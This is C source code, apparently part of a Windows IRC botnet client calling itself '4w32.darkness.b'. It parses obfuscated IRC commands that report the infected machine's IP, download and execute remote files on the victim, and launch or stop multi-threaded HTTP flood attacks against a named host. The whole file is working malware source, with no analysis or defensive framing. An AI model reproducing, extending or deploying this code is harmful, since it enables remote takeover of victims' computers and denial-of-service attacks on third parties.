#include "cmd.h"
#include "irc.h"
#include "mylib.h"
#include "flood.h"

#include <windows.h>
#include <wininet.h>

const char *cmd[]= {
    "VOTM&@","3xyfy", // PING :, .stat
    "8nv0o‚omD*", // .dl&exec: 
    "5|uh|{o","3j}ny", // .exit, .unauth
    "9s{qwzzo+", // .httpflood 
    "8}~yzpvyyn" // .stopflood
};
             
void 
IrcParse
(char *buf) {
    char tmp[0x40], *p, *exec; 
    unsigned long numCmd,BytesWritten;
    for(numCmd=0x0; numCmd < sizeof(cmd) / sizeof(cmd[0x0]); numCmd++) {
        if((exec=strstr(buf,riddle_enc(cmd[numCmd])))) {
           exec += strlen(cmd[numCmd]);
           if(p=strchr(exec,'\r'))
              p[0x0]='\0';
           switch(numCmd) {
                case PING:
                   p=malloc(0x40);
                   strcpy(p,exec);
                   sprintf(tmp,"PONG :%s\r\n",p);
                   send(irc.sock,tmp,strlen(tmp),0x0);
                   IrcJoin(irc.channel); 
                   goto exit;
                   break;
                case STAT: 
                    sprintf(tmp,
                       "[*] 4w32.darkness.b Version: 1.0 [11%s]",
                       GetLocalIpAddress()); 
                    IrcSend(tmp);
                    break;
                case DLEXEC: 
                    BytesWritten=GetExeFile(exec,COMMAND_TYPE_IRC);
                    sprintf(tmp,
                        riddle_enc("‡Q‰Lp›£š˜›LQŸZLT/]]QLŽ¥ ‘ŸL žšŸ’‘žž‘/U"), // [%c] Download %s. (11%d bytes transferred)
                        !BytesWritten ? '-' : '+',
                        !BytesWritten ? "Failed" : "Succeeded", BytesWritten); // Failed, Succeeded
                    IrcSend(tmp);
                    break;
                case UNAUTH: 
                    irc.auth=0x0;
                    goto exit;
                    break;
                case EXIT: closesocket(irc.sock); break; 
                case HTTPFLOOD:
                   flood.activated=0x1;
                   if(p=strchr(exec,' ')) {
                     p[0x0]='\0';
                     p += 0x1;
                   }
                   sprintf(tmp,"[*] %d threaded flood initiated on host: %s.",atoi(p),exec);
                   IrcSend(tmp);
                   HttpFlood(exec,atoi(p));
                   break;
                case STOPFLOOD: 
                    flood.activated=0x0;
                    strcpy(tmp,"[*] Flood stopped.");
                    IrcSend(tmp);
                    break;
           } 
        }
        else continue; 
    }
    exit:
    free(p);
    memset(buf,'\0',sizeof(buf));
    ExitThread(0x0); 
}
